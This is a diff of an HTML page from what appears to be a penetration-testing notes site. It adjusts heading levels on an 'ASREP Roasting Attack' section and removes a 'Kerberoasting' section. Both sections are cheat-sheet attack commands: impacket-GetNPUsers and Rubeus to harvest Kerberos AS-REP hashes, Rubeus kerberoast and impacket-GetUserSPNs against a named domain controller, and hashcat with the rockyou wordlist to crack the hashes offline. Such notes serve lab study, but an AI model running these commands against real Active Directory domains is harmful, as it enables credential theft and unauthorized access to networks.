@@ -173,12 +173,12 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="we-got-users-but-no-pass"><a class="header" href="#we-got-users-but-no-pass">We got Users but no Pass?</a></h1>
+                        <h2 id="we-got-users-but-no-pass"><a class="header" href="#we-got-users-but-no-pass">We got Users but no Pass?</a></h2>
 <h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://github.com/GhostPack/Rubeus">GitHub Rubeus</a></li>
 </ul>
-<h4 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h4>
+<h3 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h3>
 <pre><code>impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
@@ -193,22 +193,6 @@ cd C:\Tools
 .\Rubeus.exe asreproast /nowrap
 
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-</code></pre>
-<h2 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h2>
-<pre><code>
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-
-cat hashes.kerberoast
-hashcat --help | grep -i "Kerberos"
-
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.205.70 corp.com/pete
-
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-
-
 </code></pre>
 
                     </main>
